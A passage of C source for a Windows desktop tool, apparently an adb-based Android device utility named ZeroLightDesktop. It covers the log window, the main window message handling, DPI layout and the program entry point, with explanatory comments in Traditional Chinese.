        int active = (id == IDC_LW_F_ALL  && g_lw_filter < 0) ||
                     (id == IDC_LW_F_INFO && g_lw_filter == 0) ||
                     (id == IDC_LW_F_OK   && g_lw_filter == 1) ||
                     (id == IDC_LW_F_WARN && g_lw_filter == 2) ||
                     (id == IDC_LW_F_ERR  && g_lw_filter == 3);
        ui_button(&u, rc.left, rc.top, cw, chh, txt,
                  active ? BTN_PRIMARY : BTN_SOFT, -1, st);
        if (di->itemState & ODS_FOCUS) {
            RECT f = rc; InflateRect(&f, -MulDiv(2, g_dpi, 96), -MulDiv(2, g_dpi, 96));
            stroke_round(&u.cv, f.left, f.top, f.right - f.left, f.bottom - f.top,
                         MulDiv(7, g_dpi, 96), TH(TC_PRI), 1.0f);
        }
        cv_end(&u.cv);
        return TRUE;
    }

    case WM_COMMAND: {
        int id = LOWORD(w);
        switch (id) {
        case IDC_LW_F_ALL:  g_lw_filter = -1; logwin_populate(); logwin_sync_buttons(); return 0;
        case IDC_LW_F_INFO: g_lw_filter = 0;  logwin_populate(); logwin_sync_buttons(); return 0;
        case IDC_LW_F_OK:   g_lw_filter = 1;  logwin_populate(); logwin_sync_buttons(); return 0;
        case IDC_LW_F_WARN: g_lw_filter = 2;  logwin_populate(); logwin_sync_buttons(); return 0;
        case IDC_LW_F_ERR:  g_lw_filter = 3;  logwin_populate(); logwin_sync_buttons(); return 0;
        case IDC_LW_COPY:
            drain_log_messages();
            if (g_logbuf && *g_logbuf) {
                if (OpenClipboard(h)) {
                    EmptyClipboard();
                    size_t bytes = (wcslen(g_logbuf) + 1) * sizeof(wchar_t);
                    HGLOBAL g = GlobalAlloc(GMEM_MOVEABLE, bytes);
                    if (g) {
                        void *dst = GlobalLock(g);
                        if (dst) { memcpy(dst, g_logbuf, bytes); GlobalUnlock(g); }
                        SetClipboardData(CF_UNICODETEXT, g);
                    }
                    CloseClipboard();
                }
            }
            return 0;
        case IDC_LW_SAVE:  save_log();  return 0;
        case IDC_LW_CLEAR:
            logbuf_clear();
            if (g_log) SetWindowTextW(g_log, L"");
            logwin_populate();
            g_last_result[0] = L'\0';
            InvalidateRect(g_main, NULL, TRUE);
            return 0;
        case IDCANCEL:
        case ID_CLOSE_LOGWIN:
            ShowWindow(h, SW_HIDE);
            return 0;
        }
        break;
    }

    case WM_KEYDOWN:
        if (w == VK_ESCAPE) { ShowWindow(h, SW_HIDE); return 0; }
        return 0;

    case WM_CLOSE:
        ShowWindow(h, SW_HIDE);      /* 記住內容，只是隱藏 */
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

static void logwin_create(void) {
    if (g_logwnd) return;

    WNDCLASSW wc;
    memset(&wc, 0, sizeof(wc));
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = logwnd_proc;
    wc.hInstance = g_hinst;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.lpszClassName = LOGWND_CLASS;
    RegisterClassW(&wc);

    g_lw_font = ui_font_at(10, 0);

    int ww = S(940), wh = S(620);
    RECT r = { 0, 0, ww, wh };
    DWORD st = WS_OVERLAPPEDWINDOW;
    AdjustWindowRectEx(&r, st, FALSE, 0);
    /*
     * 以主視窗為 owner（而不是 NULL）：
     * owned window 在 z 序上永遠排在 owner 之上，所以紀錄視窗不會再開到
     * 主視窗後面（實測回報的現象）。同時它不會多佔一個工作列按鈕，
     * 最小化主視窗時也會一起收起來 —— 這正是使用者對「附屬視窗」的預期。
     */
    g_logwnd = CreateWindowExW(0, LOGWND_CLASS, T(STR_CARD_LOG), st,
                               CW_USEDEFAULT, CW_USEDEFAULT,
                               r.right - r.left, r.bottom - r.top,
                               g_main, NULL, g_hinst, NULL);
    if (!g_logwnd) return;

    g_lw_edit = CreateWindowExW(0, LOGCLS, L"",
        WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | WS_VSCROLL | ES_AUTOVSCROLL,
        0, 0, 10, 10, g_logwnd, (HMENU)(INT_PTR)IDC_LW_EDIT, g_hinst, NULL);
    if (g_lw_edit) {
        SendMessageW(g_lw_edit, EM_SETBKGNDCOLOR, 0, (LPARAM)TH(TC_CARD2));
        SendMessageW(g_lw_edit, EM_EXLIMITTEXT, 0, (LPARAM)(4 * 1024 * 1024));
        SendMessageW(g_lw_edit, EM_SETREADONLY, TRUE, 0);
        SendMessageW(g_lw_edit, WM_SETFONT, (WPARAM)(g_lw_font ? g_lw_font : g_font_body), TRUE);
    }

    struct { int id; const wchar_t *txt; } defs[8] = {
        { IDC_LW_F_ALL,  NULL }, { IDC_LW_F_INFO, NULL }, { IDC_LW_F_OK,   NULL },
        { IDC_LW_F_WARN, NULL }, { IDC_LW_F_ERR,  NULL }, { IDC_LW_COPY,  NULL },
        { IDC_LW_SAVE,   NULL }, { IDC_LW_CLEAR,  NULL },
    };
    for (int i = 0; i < 8; i++) {
        g_lw_btn[i] = CreateWindowExW(0, L"BUTTON", L"",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW,
            0, 0, 10, 10, g_logwnd, (HMENU)(INT_PTR)defs[i].id, g_hinst, NULL);
        if (g_lw_btn[i] && g_lw_font) SendMessageW(g_lw_btn[i], WM_SETFONT, (WPARAM)g_lw_font, TRUE);
    }
    logwin_retitle();
    logwin_layout(g_logwnd);
}

/* 語言或主題變更時更新文字 */
static void logwin_retitle(void) {
    if (!g_logwnd) return;
    SetWindowTextW(g_logwnd, T(STR_CARD_LOG));
    if (g_lw_btn[0]) SetWindowTextW(g_lw_btn[0], T(STR_LW_ALL));
    if (g_lw_btn[1]) SetWindowTextW(g_lw_btn[1], T(STR_LW_INFO));
    if (g_lw_btn[2]) SetWindowTextW(g_lw_btn[2], T(STR_LW_OK));
    if (g_lw_btn[3]) SetWindowTextW(g_lw_btn[3], T(STR_LW_WARN));
    if (g_lw_btn[4]) SetWindowTextW(g_lw_btn[4], T(STR_LW_ERR));
    if (g_lw_btn[5]) SetWindowTextW(g_lw_btn[5], T(STR_BTN_COPYLOG));
    if (g_lw_btn[6]) SetWindowTextW(g_lw_btn[6], T(STR_BTN_SAVELOG));
    if (g_lw_btn[7]) SetWindowTextW(g_lw_btn[7], T(STR_BTN_CLEARLOG));
}

static void logwin_open(void) {
    logwin_create();
    if (!g_logwnd) return;
    logwin_retitle();
    logwin_layout(g_logwnd);
    logwin_populate();
    logwin_apply_theme();
    ShowWindow(g_logwnd, SW_SHOW);
    BringWindowToTop(g_logwnd);      /* owner 關係已保證在其上，這只是保險 */
    SetForegroundWindow(g_logwnd);   /* 讓 Rich Edit 可直接選取／複製 */
}

/* ================= 視窗程序 ================= */

static LRESULT CALLBACK wndproc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_PAINT:
        ui_paint(h);
        return 0;

    case WM_ERASEBKGND:
        return 1;                       /* 全部由雙緩衝重畫，避免閃爍 */

    case WM_SIZE:
        if (w != SIZE_MINIMIZED) {
            ui_calc();
            ui_sync_children();
            InvalidateRect(h, NULL, TRUE);
        }
        return 0;

    case WM_DPICHANGED: {
        g_dpi = HIWORD(w);
        RECT *r = (RECT *)l;
        SetWindowPos(h, NULL, r->left, r->top,
                     r->right - r->left, r->bottom - r->top,
                     SWP_NOZORDER | SWP_NOACTIVATE);
        i18n_make_font(h);
        ui_make_fonts();
        if (g_log) SendMessageW(g_log, WM_SETFONT, (WPARAM)g_font_body, TRUE);
        fit_client(h, S(WIN_W), S(WIN_H));
        ui_calc();
        ui_sync_children();
        InvalidateRect(h, NULL, TRUE);
        return 0;
    }

    case WM_MOUSEMOVE: {
        int id = ui_hit(GET_X_LPARAM(l), GET_Y_LPARAM(l));
        if (id != g_hover) {
            g_hover = id;
            InvalidateRect(h, NULL, FALSE);
        }
        TRACKMOUSEEVENT tme;
        tme.cbSize = sizeof(tme);
        tme.dwFlags = TME_LEAVE;
        tme.hwndTrack = h;
        tme.dwHoverTime = 0;
        TrackMouseEvent(&tme);
        return 0;
    }

    case WM_MOUSELEAVE:
        if (g_hover != EL_NONE) { g_hover = EL_NONE; InvalidateRect(h, NULL, FALSE); }
        return 0;

    case WM_LBUTTONDOWN: {
        int id = ui_hit(GET_X_LPARAM(l), GET_Y_LPARAM(l));
        if (id != EL_NONE) {
            g_press = id;
            SetCapture(h);
            InvalidateRect(h, NULL, FALSE);
        }
        return 0;
    }

    case WM_LBUTTONUP: {
        int id = ui_hit(GET_X_LPARAM(l), GET_Y_LPARAM(l));
        int was = g_press;
        g_press = EL_NONE;
        ReleaseCapture();
        InvalidateRect(h, NULL, FALSE);
        if (was != EL_NONE && was == id) ui_invoke(id);
        return 0;
    }

    case WM_KEYDOWN:
        if (w == VK_ESCAPE) {
            if (g_lang_open) { g_lang_open = 0; ui_calc(); InvalidateRect(h, NULL, TRUE); return 0; }
            if (g_set_open)  { ui_invoke(EL_CLOSE_SET); return 0; }
        }
        return 0;

    case WM_SETTINGCHANGE:
        theme_refresh();
        InvalidateRect(h, NULL, TRUE);
        return 0;

    case WM_CTLCOLOREDIT:
    case WM_CTLCOLORSTATIC: {
        HDC dc = (HDC)w;
        SetTextColor(dc, TH(TC_TEXT));
        SetBkColor(dc, TH(TC_CARD2));
        static HBRUSH br = NULL;
        if (br) DeleteObject(br);
        br = CreateSolidBrush(TH(TC_CARD2));
        return (LRESULT)br;
    }

    case WM_CLOSE:
        if (InterlockedCompareExchange(&g_busy, 0, 0) != 0) {
            wchar_t msg[1024];
            if (swprintf(msg, 1024, L"%ls\r\n\r\n%ls",
                         T(STR_LOG_BUSY), T(STR_BTN_CANCEL)) < 0) msg[1023] = L'\0';
            if (confirm_dialog(msg, Tf(STR_APP_TITLE, ZL_VERSION),
                               MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON2) != IDYES) return 0;
            log_msg(STR_LOG_CANCELLING);
            InterlockedExchange(&g_cancel, 1);
            InterlockedExchange(&g_close_when_idle, 1);
            return 0;
        }
        DestroyWindow(h);
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;

    /* ---- 背景執行緒回報 ---- */
    case WM_LOG:
        if (l) {
            const wchar_t *line = (const wchar_t *)l;
            logbuf_append(line);
            log_append_ui(line);
            /* 獨立紀錄視窗若有開，即時同步（依目前篩選） */
            if (g_logwnd && IsWindowVisible(g_logwnd) && g_lw_edit) {
                int lv2 = 0;
                COLORREF c2 = log_level_color(line, &lv2);
                int pass = (g_lw_filter < 0)
                         || (g_lw_filter == 0 ? (lv2 == 0 || lv2 == 4) : lv2 == g_lw_filter);
                if (pass) {
                    int cur = GetWindowTextLengthW(g_lw_edit);
                    if (cur > 0 && cur <= 32) {
                        wchar_t tmp[64] = L"";
                        GetWindowTextW(g_lw_edit, tmp, 64);
                        if (wcscmp(tmp, T(STR_LOG_EMPTY)) == 0) SetWindowTextW(g_lw_edit, L"");
                    }
                    rich_append(g_lw_edit, line, c2);
                }
            }
            /* 保留最近兩行，供收合狀態預覽 */
            wcsncpy(g_logtail[0], g_logtail[1], 511); g_logtail[0][511] = L'\0';
            wcsncpy(g_logtail[1], line, 511);         g_logtail[1][511] = L'\0';
            if (g_logtail_n < 2) g_logtail_n++;
            /* 讓收合狀態的摘要跟著更新 */
            int is_err = (wcsstr(line, L"[!]") != NULL);
            if (wcsstr(line, L"[+]") || is_err) {
                wcsncpy(g_last_result, line, 255);
                g_last_result[255] = L'\0';
                g_last_ok = !is_err;
            }
            /*
             * 失敗時自動展開紀錄：使用者說「只有失敗時才看」，
             * 所以平常收合、一出錯就把完整內容攤開，不必手動按展開。
             */
            if (is_err && !g_log_open) {
                g_log_open = 1;
                ui_calc();
                ui_sync_children();
            }
            free((void *)l);
            InvalidateRect(h, NULL, FALSE);
        }
        return 0;

    case WM_STAT:
        if (l) {
            wcsncpy(g_status_text, (const wchar_t *)l, 511);
            g_status_text[511] = L'\0';
            free((void *)l);
            InvalidateRect(h, NULL, FALSE);
        }
        return 0;

    case WM_INFO:
        if (l) free((void *)l);
        /*
         * 一定要重算版面：主要卡的高度取決於 g_dev.rooted，而這個值會被
         * 背景輪詢改動。若只重繪不重算，命中矩形會停留在舊版面，
         * 自繪元件就會被畫在錯誤的位置（實測：開關被畫到卡片外，
         * 與 root 指令列重疊）。
         */
        ui_calc();
        ui_sync_children();
        InvalidateRect(h, NULL, TRUE);
        return 0;

    case WM_SERIAL:
        if (l) {
            if (g_serial_edit) SetWindowTextW(g_serial_edit, (const wchar_t *)l);
            free((void *)l);
        }
        return 0;

    case WM_BUSY:
        set_busy_ui((int)w);
        if (!w && InterlockedCompareExchange(&g_close_when_idle, 0, 0) != 0) {
            InterlockedExchange(&g_close_when_idle, 0);
            DestroyWindow(h);
        }
        return 0;

    case WM_PROG:
        if ((int)w < 0) {
            g_prog_show = 0;
        } else {
            g_prog_show = 1;
            g_prog_frac = (double)(int)w / 100.0;
        }
        InvalidateRect(h, NULL, FALSE);
        return 0;

    case WM_APPLYLANG:
        apply_language((int)w);
        return 0;

    case WM_TIMER:
        if (w == TIMER_POLL) {
            start_poll();
        } else if (w == TIMER_POLL + 1) {
            KillTimer(h, TIMER_POLL + 1);   /* 只做一次的起始查詢 */
            start_poll();
        }
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

/* ================= 進入點 ================= */

int WINAPI wWinMain(HINSTANCE hinst, HINSTANCE prev, PWSTR cmdline, int show) {
    (void)prev; (void)cmdline;
    g_hinst = hinst;

    GetModuleFileNameW(NULL, g_exe_dir, MAX_PATH);
    {
        wchar_t *p = wcsrchr(g_exe_dir, L'\\');
        if (p) *p = L'\0';
    }

    /* 建立視窗前只能先估一個 DPI；真正的值在視窗建立後以 dpi_for_window() 校正 */
    g_dpi = dpi_for_window(NULL);

    settings_load();

    /* adb 自動偵測：多個常見位置 */
    if (wcscmp(g_adb, L"adb") == 0) {
        static const wchar_t *cands[] = {
            L"%LOCALAPPDATA%\\Android\\Sdk\\platform-tools\\adb.exe",
            L"%USERPROFILE%\\AppData\\Local\\Android\\Sdk\\platform-tools\\adb.exe",
            L"C:\\Android\\platform-tools\\adb.exe",
            L"C:\\platform-tools\\adb.exe",
            L"%ProgramFiles%\\Android\\platform-tools\\adb.exe",
        };
        for (int i = 0; i < (int)(sizeof(cands) / sizeof(cands[0])); i++) {
            wchar_t expanded[MAX_PATH];
            if (ExpandEnvironmentStringsW(cands[i], expanded, MAX_PATH) > 0 &&
                GetFileAttributesW(expanded) != INVALID_FILE_ATTRIBUTES) {
                wcscpy(g_adb, expanded);
                break;
            }
        }
    }

    INITCOMMONCONTROLSEX icc;
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_STANDARD_CLASSES;
    InitCommonControlsEx(&icc);

    gdip_init();                 /* GDI+：抗鋸齒圓角／圓形／圖示 */
    theme_apply(g_theme_mode);   /* settings_load() 已讀入偏好，預設跟隨系統 */
    LoadLibraryW(L"Msftedit.dll");   /* Rich Edit 5.0（紀錄分級上色） */

    i18n_make_font(NULL);

    WNDCLASSW wc;
    memset(&wc, 0, sizeof(wc));
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = wndproc;
    wc.hInstance = hinst;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"ZeroLightDesktop";
    if (!RegisterClassW(&wc)) {
        /* 此時尚無視窗，但仍已載入語系設定，故可用對照表 */
        MessageBoxW(NULL, T(STR_DLG_ERROR_TITLE), T(STR_APP_TITLE_SUFFIX),
                    MB_OK | MB_ICONERROR);
        return 1;
    }

    /*
     * ui_build() 以「客戶區」座標排版，但 CreateWindowExW 收的是「視窗」尺寸。
     * 若直接把 S(WIN_W)×S(WIN_H) 當視窗尺寸，客戶區會少掉標題列與邊框
     * （96 DPI 約 31 px 高、16 px 寬）→ 狀態列被截掉、右側控制項超出。
     * 因此先用 AdjustWindowRectEx 把客戶區尺寸換算成視窗尺寸。
     */
    DWORD wstyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_THICKFRAME;
    DWORD wex = i18n_is_rtl() ? (WS_EX_LAYOUTRTL | WS_EX_RTLREADING) : 0;

    /* 先用暫定尺寸建立視窗，稍後再依「它實際落在哪個螢幕」校正 DPI 與大小 */
    g_main = CreateWindowExW(wex, L"ZeroLightDesktop",
                             Tf(STR_APP_TITLE, ZL_VERSION),
                             wstyle,
                             CW_USEDEFAULT, CW_USEDEFAULT,
                             S(WIN_W), S(WIN_H),
                             NULL, NULL, hinst, NULL);
    if (!g_main) return 1;

    /*
     * 視窗建立後才知道它真正的 DPI。這個順序很重要：
     *   1) 校正 g_dpi（決定所有 S() 縮放）
     *   2) 用正確 DPI 重建字型
     *   3) 把客戶區精準設為 S(WIN_W) x S(WIN_H)
     *   4) 才建立子控制項
     * 少了這一步，在 200%% 縮放的螢幕上會出現「字型正常但視窗只有一半大」的錯配。
     */
    {
        int real = dpi_for_window(g_main);
        if (real != g_dpi) g_dpi = real;
        /*
         * 診斷用覆寫：ZL_FORCE_DPI=96 可在 200% 縮放的機器上驗證 100% 的版面，
         * 不必更改系統顯示設定（也便於日後支援遠端桌面／混合 DPI 問題）。
         */
        wchar_t env[16];
        if (GetEnvironmentVariableW(L"ZL_FORCE_DPI", env, 16) > 0) {
            int d = _wtoi(env);
            if (d >= 72 && d <= 960) g_dpi = d;
        }
    }
    i18n_make_font(g_main);
    fit_client(g_main, S(WIN_W), S(WIN_H));

    ui_make_fonts();
    ui_create_children();

    ShowWindow(g_main, show);
    /*
     * ShowWindow 之後才做最後一次尺寸校正：此時 WM_DPICHANGED 建議矩形
     * 已經套用過，客戶區才是最終值。之後任何尺寸變動都由 WM_SIZE → ui_layout()
     * 接手，因此即使校正結果與理想值有落差，版面也不會被裁切。
     */
    fit_client(g_main, S(WIN_W), S(WIN_H));
    /*
     * 置中於「工作區」並夾限大小。
     * 只用 SetWindowPos 指定大小不夠：若視窗底部落到工作列底下，
     * 狀態列會被工作列蓋住（實測 200% 縮放時視窗比工作區高 11 px）。
     */
    {
        MONITORINFO mi;
        memset(&mi, 0, sizeof(mi));
        mi.cbSize = sizeof(mi);
        if (GetMonitorInfoW(MonitorFromWindow(g_main, MONITOR_DEFAULTTONEAREST), &mi)) {
            RECT wr; GetWindowRect(g_main, &wr);
            int ww = wr.right - wr.left, wh = wr.bottom - wr.top;
            int mw = mi.rcWork.right - mi.rcWork.left;
            int mh = mi.rcWork.bottom - mi.rcWork.top;
            if (ww > mw) ww = mw;
            if (wh > mh) wh = mh;
            SetWindowPos(g_main, NULL,
                         mi.rcWork.left + (mw - ww) / 2,
                         mi.rcWork.top  + (mh - wh) / 2,
                         ww, wh, SWP_NOZORDER | SWP_NOACTIVATE);
        }
    }
    InitializeCriticalSection(&g_dev_cs);
    wcsncpy(g_status_text, T(STR_ST_READY), 511);
    g_status_text[511] = L'\0';
    ui_calc();
    ui_sync_children();
    ui_apply_theme(g_theme_mode);
    UpdateWindow(g_main);
    /*
     * 開機後先查一次（1.5 秒後），讓視窗一打開就顯示真實狀態而不是空殼；
     * 之後每 30 秒輪詢一次。兩者都走背景執行緒，不阻塞 UI。
     */
    SetTimer(g_main, TIMER_POLL, 30000, NULL);
    SetTimer(g_main, TIMER_POLL + 1, 1500, NULL);

    {
        SYSTEMTIME st;
        GetLocalTime(&st);
        log_msg(STR_LOG_START_1, ZL_VERSION);
        log_msg(STR_LOG_START_TIME, st.wYear, st.wMonth, st.wDay,
                st.wHour, st.wMinute, st.wSecond);
        log_msg(STR_LOG_EXE_DIR, g_exe_dir);
        log_msg(STR_LOG_START_ADB, g_adb);
        log_msg(STR_LOG_DPI, g_dpi);
        log_msg(STR_LOG_FONT, g_font_name);
        log_msg(STR_LOG_START_FW);
        log_msg(STR_LOG_START_OTA);
        log_msg(STR_LOG_START_ORDER);
        log_msg(STR_LOG_START_WARN);
    }

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        /*
         * IsDialogMessageW 會把 Esc 當成「關閉對話框」而吞掉，永遠送不到
         * wndproc（設定浮層就關不掉）。這裡先把它撈出來自己處理，
         * 其餘按鍵仍交給 IsDialogMessageW 以保留 Tab 在輸入框之間移動。
         */
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_ESCAPE) {
            SendMessageW(g_main, WM_KEYDOWN, VK_ESCAPE, 0);
            continue;
        }
        if (!IsDialogMessageW(g_main, &msg)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    if (g_main) KillTimer(g_main, TIMER_POLL);
    DeleteCriticalSection(&g_dev_cs);
    if (g_logbuf) free(g_logbuf);
    gdip_shutdown();
    return 0;
}
